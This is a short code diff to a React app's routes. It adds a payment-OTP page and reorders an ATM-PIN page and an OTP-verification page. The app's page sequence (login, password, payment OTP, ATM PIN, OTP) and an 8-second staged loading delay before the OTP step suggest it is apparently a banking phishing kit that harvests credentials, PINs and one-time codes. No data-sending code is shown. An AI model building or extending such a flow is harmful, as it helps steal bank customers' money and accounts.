@@ -12,6 +12,7 @@ import PersonalInfo from "./pages/PersonalInfo";
 import Login from "./pages/Login";
 import Password from "./pages/Password";
 import RegistrationComplete from "./pages/RegistrationComplete";
+import PaymentOTP from "./pages/PaymentOTP";
 import OTPVerification from "./pages/OTPVerification";
 import ATMPin from "./pages/ATMPin";
 import Success from "./pages/Success";
@@ -27,8 +28,8 @@ const AppContent = () => {
   useEffect(() => {
     setIsLoading(true);
     
-    // Check if navigating from registration-complete to otp-verification
-    const isPaymentToOTP = previousPath === "/registration-complete" && location.pathname === "/otp-verification";
+    // Check if navigating from registration-complete to payment-otp
+    const isPaymentToOTP = previousPath === "/registration-complete" && location.pathname === "/payment-otp";
     const loadingDuration = isPaymentToOTP ? 8000 : 1500; // 8 seconds for payment to OTP, 1.5 seconds for others
     
     const timer = setTimeout(() => {
@@ -53,8 +54,9 @@ const AppContent = () => {
       <Route path="/personal-info" element={<PersonalInfo />} />
       <Route path="/password" element={<Password />} />
       <Route path="/registration-complete" element={<RegistrationComplete />} />
-      <Route path="/otp-verification" element={<OTPVerification />} />
+      <Route path="/payment-otp" element={<PaymentOTP />} />
       <Route path="/atm-pin" element={<ATMPin />} />
+      <Route path="/otp-verification" element={<OTPVerification />} />
       <Route path="/success" element={<Success />} />
       {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
       <Route path="*" element={<NotFound />} />
